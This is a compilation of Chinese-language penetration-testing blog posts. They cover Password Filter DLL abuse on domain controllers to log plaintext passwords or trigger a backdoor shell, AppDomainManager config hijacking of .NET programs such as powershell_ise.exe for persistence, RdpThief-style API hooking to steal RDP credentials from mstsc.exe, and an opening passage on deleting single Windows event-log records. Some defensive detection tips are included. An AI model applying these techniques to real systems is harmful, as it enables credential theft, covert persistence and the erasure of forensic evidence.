<p>6、记录明文密码</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>能够记录所有用户，包括未登录用户</p>

<h2 id="0x05-域环境下的应用">0x05 域环境下的应用</h2>
<hr>

<h3 id="1记录明文密码">1、记录明文密码</h3>

<p>针对域控服务器,需要获得域控服务器权限，在%windir%\system32\下放置Password Filter DLL，修改注册表键值</p>

<h4 id="优势">优势：</h4>

<p>域控服务器默认开启组策略密码必须符合复杂性要求</p>

<h4 id="不足">不足：</h4>

<p>必须重启系统才能生效，对于域控服务器来说，很少重启</p>

<h4 id="扩展">扩展：</h4>

<p>将payload改为将明文密码发送至Web服务器，可供参考的代码地址：</p>

<p>https://malicious.link/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</p>

<h3 id="2后门">2、后门</h3>

<p>将Password Filter DLL改为启动后门，例如弹回Meterpreter的shell</p>

<p>域内任一用户在修改密码时均会加载Password Filter DLL，弹回高权限的shell</p>

<h2 id="0x06-非windows-server系统的应用">0x06 非Windows Server系统的应用</h2>
<hr>

<p>目前大部分资料均认为Password Filter DLL仅适用Windows Server系统</p>

<p>对于非Windows Server系统来说，同样可以使用，只是组策略默认禁用<code class="language-plaintext highlighter-rouge">组策略密码必须符合复杂性要求</code></p>

<p>因此需要注意以下问题：</p>

<h3 id="1命令行查看当前系统的组策略配置">1、命令行查看当前系统的组策略配置</h3>

<p>组策略配置存储在数据库中，位于<code class="language-plaintext highlighter-rouge">%windir%\security\database\secedit.sdb</code></p>

<p>读取命令如下(管理员权限)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secedit /export /cfg gp.inf /quiet
</code></pre></div></div>

<p>参数说明：</p>

<ul>
  <li>
    <p>没有设置/db参数，表示数据库采用默认<code class="language-plaintext highlighter-rouge">%windir%\security\database\secedit.sdb</code></p>
  </li>
  <li>
    <p>/quiet表示不生成日志，否则生成的日志默认保存在<code class="language-plaintext highlighter-rouge">%windir%\security\logs\scesrv.log</code></p>
  </li>
</ul>

<p>命令执行后生成文件gp.inf，查看gp.inf中的PasswordComplexity项，1代表开启，0代表关闭</p>

<p><strong>注：</strong></p>

<p>gp.inf中的内容不完整，想要获得完整的组策略配置还需要读取注册表</p>

<h3 id="2修改组策略配置开启组策略密码必须符合复杂性要求">2、修改组策略配置，开启组策略密码必须符合复杂性要求</h3>

<p>首先导出配置文件gp.inf，将PasswordComplexity项设为1，保存</p>

<p>导入数据库：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secedit /configure /db gp.sdb /cfg gp.inf /quiet
</code></pre></div></div>

<p>刷新组策略，立即生效(否则，重启后生效)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gpupdate/force
</code></pre></div></div>

<h2 id="0x07-防御检测">0x07 防御检测</h2>
<hr>

<p>根据利用思路，攻击者首先需要获得当前系统的管理员权限</p>

<p>检测思路如下：</p>

<p>1、查看<code class="language-plaintext highlighter-rouge">%windir%\system32\</code>下有无可疑dll</p>

<p>2、查看注册表键值<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code class="language-plaintext highlighter-rouge">Notification Packages</code></p>

<p>3、查看进程lsass.exe加载的dll</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/3-1.png" alt="Alt text"></p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>Password Filter DLL本是系统提供的正常功能，但如果获得了系统的管理员权限，利用这项功能不仅能够记录明文密码，还能用作后门。</p>

<p>本文结合具体的利用思路，介绍了检测方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March  3, 2018
  </div>

  
</article><article class="post">
  <h1>Use AppDomainManager to maintain persistence</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>从Casey Smith@subTee学到的一个技巧：针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。
如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制。</p>

<p><strong>学习链接：</strong></p>

<p>http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>劫持自己开发的.Net程序</li>
  <li>劫持系统.Net程序powershell_ise.exe</li>
  <li>一种针对Visual Studio的利用思路</li>
</ul>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<p><strong>CLR：</strong></p>

<p>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。</p>

<p>CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</p>

<ul>
  <li>在CLR监视之下运行的程序属于“托管的”（managed）代码</li>
  <li>不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码</li>
</ul>

<p>对于在CLR监视之下的程序，程序启动的初始化过程可参考如下链接：</p>

<p>http://mattwarren.org/2017/02/07/The-68-things-the-CLR-does-before-executing-a-single-line-of-your-code/</p>

<p><strong>值得注意的地方：</strong></p>

<p>如果能从程序启动的初始化过程中找到一个可供利用的位置，在程序启动之前加载我们自己的代码，那么就可以“滥用”CLR的功能，实现对程序的劫持</p>

<p><strong>更理想的情况下：</strong></p>

<p>如果可被劫持的程序是一个系统常用程序，随开机自启动，那么，这个方法就能作为一个持续性后门</p>

<p>下面介绍Casey Smith@subTee分享的后门思路：<code class="language-plaintext highlighter-rouge">AppDomainManager</code></p>

<h2 id="0x03-劫持自己开发的net程序">0x03 劫持自己开发的.Net程序</h2>
<hr>

<p><strong>注：</strong></p>

<p>代码引用自：http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html</p>

<h3 id="1编写示例程序">1、编写示例程序</h3>

<p>使用Visual Studio，选择c#开发环境，新建控制台应用程序，工程名：program，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Inside the App");
    }
}
</code></pre></div></div>

<p>编译生成program.exe</p>

<p>程序运行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-1.png" alt="Alt text"></p>

<h3 id="2编写payload-dll">2、编写payload Dll</h3>

<p>选择c#开发环境，新建类库，工程名：DomainManager，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;

namespace DomainManager
{
    public class InjectedDomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            base.InitializeNewDomain(appDomainInfo);
            Console.WriteLine("Blah From AppMgr");
        }
    }
}
</code></pre></div></div>

<p>编译生成DomainManager.dll</p>

<h3 id="3设置appdomainmanager劫持程序启动">3、设置AppDomainManager劫持程序启动</h3>

<p>将DomainManager.dll放于同级目录</p>

<p><strong>方法1：</strong></p>

<p>cmd设置环境变量：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager
</code></pre></div></div>

<p>执行program.exe，通过查看回显，发现DomainManager.dll先于program.exe执行</p>

<p>成功实现劫持，完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>注意比较执行顺序</p>

<p>通过cmd设置环境变量的方法只会作用于当前cmd，不够通用</p>

<p><strong>方法2：</strong></p>

<p>更加通用的方法：配置config文件</p>

<p>新建program.exe.config，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;configuration&gt;
  &lt;startup&gt;
    &lt;supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/&gt;
  &lt;/startup&gt;
    &lt;runtime&gt;
      &lt;appDomainManagerType value="DomainManager.InjectedDomainManager" /&gt;
      &lt;appDomainManagerAssembly
         value="DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" /&gt;
    &lt;/runtime&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>config文件命名格式：exe+.config</p>

<p>成功实现劫持，完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-3.png" alt="Alt text"></p>

<h2 id="0x04-劫持系统net程序powershell_iseexe">0x04 劫持系统.Net程序powershell_ise.exe</h2>
<hr>

<p>接下来，需要找到可供利用的系统.Net程序，尝试实现持久性后门</p>

<p>这里选取powershell_ise.exe作为演示</p>

<p><strong>注：</strong></p>

<p>powershell_ise.exe：全称Windows PowerShell Integrated Scripting Environment（集成脚本环境）</p>

<p>图形界面，主要用于编写和调试powershell脚本</p>

<p>操作界面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-1.png" alt="Alt text"></p>

<p>为了便于演示，我们需要修改工程DomainManager，使其在运行时弹框</p>

<h3 id="1添加引用">1、添加引用</h3>

<p>工程-右键-添加引用，选择System.Windows.Forms</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-2.png" alt="Alt text"></p>

<p>代码修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Windows.Forms; 
namespace DomainManager
{
    public class InjectedDomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            base.InitializeNewDomain(appDomainInfo);
            Console.WriteLine("Blah From AppMgr");
            MessageBox.Show("1");
        }
    }
}
</code></pre></div></div>

<p>重新编译生成DomainManager.dll</p>

<h3 id="2测试">2、测试</h3>

<p>劫持program.exe成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-3.png" alt="Alt text"></p>

<p>劫持powershell_ise.exe：</p>

<p><strong>（1）</strong> 测试test目录</p>

<p>将powershell_ise.exe复制到<code class="language-plaintext highlighter-rouge">c:\test</code></p>

<p>在同级目录新建powershell_ise.exe.config,config文件可作适当精简，精简后的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;configuration&gt;
  &lt;startup&gt;
    &lt;supportedRuntime version="v4.0" /&gt;
  &lt;/startup&gt;
    &lt;runtime&gt;
      &lt;appDomainManagerType value="DomainManager.InjectedDomainManager" /&gt;
      &lt;appDomainManagerAssembly value="DomainManager" /&gt;
    &lt;/runtime&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<p>在<code class="language-plaintext highlighter-rouge">c:\test</code>目录下启动powershell_ise.exe</p>

<p>成功劫持powershell_ise.exe</p>

<p>（2）测试powershell_ise.exe默认目录</p>

<p>路径如下：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\WindowsPowerShell\v1.0</code></p>

<p>需要管理员权限，在默认目录创建劫持文件DomainManager.dll和powershell_ise.exe.config</p>

<p>编译任意powershell脚本，默认启动powershell_ise.exe，成功劫持</p>

<p>完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/4-1.gif" alt="Alt text"></p>

<h2 id="0x05-一种针对visual-studio的利用思路">0x05 一种针对Visual Studio的利用思路</h2>
<hr>

<p>对于Visual Studio的c#工程，在工程目录下默认存在文件App.config，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;configuration&gt;
    &lt;startup&gt; 
        &lt;supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" /&gt;
    &lt;/startup&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<p>如果对其修改，添加劫持功能，那么在编译程序时，也会同步修改bin目录下默认生成的config文件</p>

<p>App.config修改如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;configuration&gt;
    &lt;startup&gt; 
        &lt;supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" /&gt;
    &lt;/startup&gt;
    &lt;runtime&gt;
      &lt;appDomainManagerType value="DomainManager.InjectedDomainManager" /&gt;
      &lt;appDomainManagerAssembly value="DomainManager" /&gt;
    &lt;/runtime&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<p>编译程序，bin目录下的config文件也被修改，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/5-1.png" alt="Alt text"></p>

<p>如果在bin目录也放置DomainManager.dll，那么在程序启动时会被劫持，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/5-2.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了一种通过修改AppDomainManager实现的被动后门触发机制，分析了利用思路，站在防御者的角度，只需要留意.Net程序同级目录下的config文件就好</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on June 15, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——从远程桌面客户端提取明文凭据</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/">《渗透技巧——获得Windows系统的远程桌面连接历史记录》</a>曾介绍了获得远程桌面连接历史记录的方法。</p>

<p>在实际的渗透过程中，如果发现了远程桌面连接的历史记录，那么下一步就需要想办法获取远程桌面连接使用的口令。</p>

<p>本文将会结合RdpThief介绍从远程桌面客户端提取明文凭据的方法，分享需要注意的细节。</p>

<p>RdpThief地址：</p>

<p>https://github.com/0x09AL/RdpThief</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>获取远程桌面连接口令的思路</li>
  <li>使用Detours库hook系统API的方法</li>
  <li>使用API monitor监控系统API调用的方法</li>
  <li>使用RdpThief从远程桌面客户端提取明文凭据</li>
</ul>

<h2 id="0x02-获取远程桌面连接口令的思路">0x02 获取远程桌面连接口令的思路</h2>
<hr>

<p>通常有以下两种：</p>

<p>1.使用键盘记录程序，记录mstsc.exe在启动过程中用户输入的口令</p>

<p>2.在mstsc.exe启动时，读取mstsc.exe的内存数据，提取出用户输入的口令</p>

<p>RdpThief是第二种实现思路，使用Detours库hook系统API，使用API monitor监控系统的API调用，找到mstsc.exe在内存中存储明文口令的位置，代码简洁有效。</p>

<h2 id="0x03-使用detours库hook系统api的方法">0x03 使用Detours库hook系统API的方法</h2>
<hr>

<p>RdpThief在实现上使用Detours库来hook系统API，所以这里简要介绍一下Detours库的用法</p>

<p>Detours库用于监视和检测Windows上的API调用，可以用来hook系统API</p>

<p>这里介绍使用Detours库hook系统API的两种方法</p>

<h3 id="1编译detours源码并使用">1.编译Detours源码并使用</h3>

<h4 id="1编译detours源码">(1)编译Detours源码</h4>

<p>下载Detours源码，地址如下：</p>

<p>https://github.com/Microsoft/Detours</p>

<p>使用Visual Studio编译Detours源码(这里以VS2015为例)，需要区分32位和64位</p>

<p>64位编译：</p>

<p>打开<code class="language-plaintext highlighter-rouge">VS2015 x64 本机工具命令提示符</code></p>

<p>执行以下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd Detours-master\src
nmake
</code></pre></div></div>

<p>命令执行后将在文件夹Detours-master下生成以下三个文件夹，包括Detours的头文件和库文件</p>

<ul>
  <li>bin.X64</li>
  <li>include</li>
  <li>lib.X64</li>
</ul>

<p>32位编译：</p>

<p>打开<code class="language-plaintext highlighter-rouge">VS2015本机工具命令提示符</code></p>

<p>执行以下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd Detours-master\src
nmake
</code></pre></div></div>

<p>命令执行后将在文件夹Detours-master下生成以下三个文件夹，包括Detours的头文件和库文件</p>

<ul>
  <li>bin.X86</li>
  <li>include</li>
  <li>lib.X86</li>
</ul>

<h4 id="2导入detours">(2)导入Detours</h4>

<p>在新建的C++工程中添加对应版本的头文件：</p>

<ul>
  <li>detours.h</li>
  <li>detours.lib</li>
</ul>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "detours.h"
#pragma comment (lib,"detours.lib")
</code></pre></div></div>

<h3 id="2通过install-package自动安装">2.通过Install-Package自动安装</h3>

<h4 id="1安装">(1)安装</h4>

<p>在Visual Studio中选择<code class="language-plaintext highlighter-rouge">工具</code>-<code class="language-plaintext highlighter-rouge">&gt;NuGet包管理器</code>-&gt;<code class="language-plaintext highlighter-rouge">程序包管理器控制台</code></p>

<p>输入安装命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-Package Detours
</code></pre></div></div>

<p>将会自动安装Detours库，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/1-1.png" alt="Alt text"></p>

<h4 id="2导入detours-1">(2)导入Detours</h4>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;detours.h&gt;
#pragma comment (lib,"detours.lib")
</code></pre></div></div>

<p>使用Detours库hook系统API时常用的几个函数：</p>

<ul>
  <li>DetourTransactionBegin();</li>
  <li>DetourUpdateThread(GetCurrentThread());</li>
  <li>DetourAttach();</li>
  <li>DetourDetach();</li>
  <li>DetourTransactionCommit()</li>
</ul>

<p>Hook系统API Messagebox()的实例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;
#include &lt;detours.h&gt;
#pragma comment (lib,"detours.lib")
static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox;
int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) {
	return TrueMessageBox(NULL, L"Hooked", lpCaption, 0);
}
int main()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&amp;(PVOID&amp;)TrueMessageBox, OurMessageBox);
	DetourTransactionCommit();
	MessageBox(NULL, L"Hello", L"Hello", 0);
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&amp;(PVOID&amp;)TrueMessageBox, OurMessageBox); 
	DetourTransactionCommit();
}
</code></pre></div></div>

<h2 id="0x04-使用api-monitor监控系统api调用的方法">0x04 使用API monitor监控系统API调用的方法</h2>
<hr>

<p>RdpThief使用API monitor监控系统的API调用，找到mstsc.exe在内存中存储明文口令的位置，这里简要介绍一下API monitor的用法</p>

<p>API monitor的下载地址：</p>

<p>http://www.rohitab.com/downloads</p>

<p>运行后需要选择进行监控的模块，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/1-2.png" alt="Alt text"></p>

<p>接着选择需要监控的进程，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/1-3.png" alt="Alt text"></p>

<p>API monitor将会监控进程运行时调用的API，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/1-4.png" alt="Alt text"></p>

<h2 id="0x05-rdpthief测试">0x05 RdpThief测试</h2>
<hr>

<p>介绍RdpThief细节的文章：</p>

<p>https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</p>

<p>RdpThief的代码里包括三部分内容：</p>

<h4 id="1c工程编译生成dll">1.C++工程，编译生成dll</h4>

<p>编译生成的dll，需要注入到mstsc.exe进程中</p>

<p>这里可以使用我之前写的dll注入的代码，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/NtCreateThreadEx%20%2B%20LdrLoadDll.cpp</p>

<p>但是需要把<code class="language-plaintext highlighter-rouge">FreeDll()</code>的功能去掉，dll需要一直在进程mstsc.exe的内存中，用来记录用户输入的口令</p>

<h4 id="2rdpthief_x64tmp">2.RdpThief_x64.tmp</h4>

<p>shellcode格式的dll，作者使用<a href="https://github.com/monoxgas/sRDI">sRDI</a>将编译好的dll转换为shellcode格式，便于cna脚本的调用</p>

<h4 id="3rdpthiefcna">3.RdpThief.cna</h4>

<p>Colbalt Strike使用的cna脚本，用于注入shellcode格式的dll</p>

<p>支持三个命令：</p>

<ul>
  <li>rdpthief_enable，每5秒搜索mstsc.exe并将dll注入</li>
  <li>rdpthief_disable，停止rdpthief_enable，但不会卸载注入的dll</li>
  <li>rdpthief_dump，显示抓取的凭据，默认读取路径为<code class="language-plaintext highlighter-rouge">%temp%\data.bin</code></li>
</ul>

<h3 id="实际测试">实际测试</h3>

<h4 id="预期功能">预期功能：</h4>

<p>在mstsc.exe中输入用户名口令后，无论是否正确，都会被记录在文件<code class="language-plaintext highlighter-rouge">%temp%\data.bin</code>中</p>

<p>1.在Win10下没有问题</p>

<p>2.在Win7下能够获得输入的用户名和口令，但无法获得Server名称</p>

<h4 id="查找问题原因">查找问题原因：</h4>

<p>RdpThief在实现上通过捕获API SspiPrepareForCredRead()获得Server名称</p>

<p>在Win7系统下，我使用API monitor监控系统调用的API，发现不存在这个API，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/2-1.png" alt="Alt text"></p>

<p>找到问题的原因</p>

<h4 id="解决方法1">解决方法1：</h4>

<p>通过搜索，发现API CredReadW() 能够记录Server名称，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-18/2-2.png" alt="Alt text"></p>

<p>所以可以尝试hook API CredReadW ，示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
{
	lpServer = TargetName;
	return OriginalCredReadW(TargetName, Type, Flags, Credential);
}
</code></pre></div></div>

<p>添加Attach和Detach代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DetourAttach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);
DetourDetach(&amp;(PVOID&amp;)OriginalCredReadW, HookedCredReadW);
</code></pre></div></div>

<h4 id="解决方法2">解决方法2：</h4>

<p>远程桌面建立连接后会在注册表保存远程桌面连接的记录，这里可以通过读取远程桌面连接的历史记录获得Server名称</p>

<p>使用的脚本地址：</p>

<p>https://github.com/3gstudent/List-RDP-Connections-History/blob/master/ListLogged-inUsers.ps1</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了使用Detours库hook系统API和使用API monitor监控系统API调用的方法，测试RdpThief，分享在Win7下使用时获得Server名称的方法，实现了从远程桌面客户端提取明文凭据。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 18, 2019
  </div>

  
</article><article class="post">
  <h1>Windows XML Event Log (EVTX)单条日志清除（一）——删除思路与实例</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows XML Event Log (EVTX)单条日志清除系列文章的第一篇，侧重于介绍evtx日志文件的基础知识和删除单条日志的实现思路与实例</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>evtx文件格式</li>
  <li>删除单条日志的思路</li>
  <li>删除单条日志的实例</li>
</ul>

<h2 id="0x02-基础知识evtx文件格式">0x02 基础知识：evtx文件格式</h2>
<hr>

<p>可参考的资料：</p>

<p>https://github.com/williballenthin/python-evtx</p>

<p>evtx文件是指Windows Vista之后用于保存系统日志信息的文件</p>

<p>evtx文件结构包含三部分：</p>

<ul>
  <li>file header</li>
  <li>chunks</li>
  <li>trailing empty values</li>
</ul>

<p><strong>注：</strong></p>

<p>file header保存evtx文件基本信息，值得注意的是Next record identifier、Number of chunks、File flags和Checksum</p>

<p>chunks保存日志内容，包括具体每条日志的内容和校验和，值得注意的是Last event record number、Last event record identifier、Last event record data offset和两个Checksum</p>

<p>trailing empty values为尾随空值，用于填充文件长度，内容任意，不会影响evtx文件的有效性</p>

<h4 id="1-file-header">(1) file header</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#2-file-header</p>

<h4 id="2-chunks">(2) chunks</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#3-chunk</p>

<p>chunks包含多个Event Record，1个Event Record对应一条日志信息</p>

<h4 id="3-event-record">(3) Event Record</h4>

<p>格式可参考：</p>

<p>https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#32-event-record</p>

<p>Event Record的内容以Binary XML格式保存</p>

<p>Binary XML格式可参考：</p>

<p>https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#4-binary-xml</p>

<p>值得注意的是EventRecordID标签，用来表示日志的顺序号</p>

<h3 id="实例演示">实例演示：</h3>

<h4 id="1通过windows日志查看">1、通过Windows日志查看</h4>

<p>查看事件日志，选中一条日志，选择<code class="language-plaintext highlighter-rouge">详细信息</code>-&gt;<code class="language-plaintext highlighter-rouge">XML视图</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/2-1.png" alt="Alt text"></p>

<h4 id="2通过python脚本查看">2、通过python脚本查看</h4>

<p>安装python-evtx：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install python-evtx
</code></pre></div></div>

<p>下载脚本：</p>

<p>https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_record_structure.py</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evtx_record_structure.py System.evtx 1915
</code></pre></div></div>

<p>回显如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: 2A 2A 00 00 38 01 00 00  7B 07 00 00 00 00 00 00  **..8...{.......
00000010: 23 EB 07 A2 D4 FB D3 01  0F 01 01 00 0C 01 65 CE  #.............e.
00000020: 1B C7 EE 0D 00 00 14 00  00 00 01 00 04 00 01 00  ................
00000030: 04 00 02 00 06 00 02 00  06 00 02 00 06 00 08 00  ................
00000040: 15 00 08 00 11 00 00 00  00 00 04 00 08 00 04 00  ................
00000050: 08 00 08 00 0A 00 01 00  04 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 8B 00  21 00 04 00 00 00 7C 1B  ........!.....|.
00000080: 00 40 00 00 00 00 00 00  80 80 23 EB 07 A2 D4 FB  .@........#.....
00000090: D3 01 D8 01 00 00 9C 07  00 00 7B 07 00 00 00 00  ..........{.....
000000A0: 00 00 00 0F 01 01 00 0C  01 DE E1 DC 34 6C 11 00  ............4l..
000000B0: 00 04 00 00 00 4E 00 01  00 08 00 01 00 04 00 08  .....N..........
000000C0: 00 0E 00 0E 00 42 00 61  00 63 00 6B 00 67 00 72  .....B.a.c.k.g.r
000000D0: 00 6F 00 75 00 6E 00 64  00 20 00 49 00 6E 00 74  .o.u.n.d. .I.n.t
000000E0: 00 65 00 6C 00 6C 00 69  00 67 00 65 00 6E 00 74  .e.l.l.i.g.e.n.t
000000F0: 00 20 00 54 00 72 00 61  00 6E 00 73 00 66 00 65  . .T.r.a.n.s.f.e
00000100: 00 72 00 20 00 53 00 65  00 72 00 76 00 69 00 63  .r. .S.e.r.v.i.c
00000110: 00 65 00 63 6B 28 57 D0  8F 4C 88 0E 00 00 00 42  .e.ck(W..L.....B
00000120: 00 49 00 54 00 53 00 2F  00 34 00 00 00 00 00 00  .I.T.S./.4......
00000130: 15 00 00 00 38 01 00 00                           ....8...
record(absolute_offset=8776)
RootNode(offset=0x18)
  StreamStartNode(offset=0x18)
  TemplateInstanceNode(offset=0x1c, resident=False)
  Substitutions(offset=0x26)
    UnsignedByteTypeNode(offset=0x7a) --&gt; 4
    UnsignedByteTypeNode(offset=0x7b) --&gt; 0
    UnsignedWordTypeNode(offset=0x7c) --&gt; 0
    UnsignedWordTypeNode(offset=0x7e) --&gt; 7036
    UnsignedWordTypeNode(offset=0x80) --&gt; 16384
    Hex64TypeNode(offset=0x82) --&gt; 0x8080000000000000
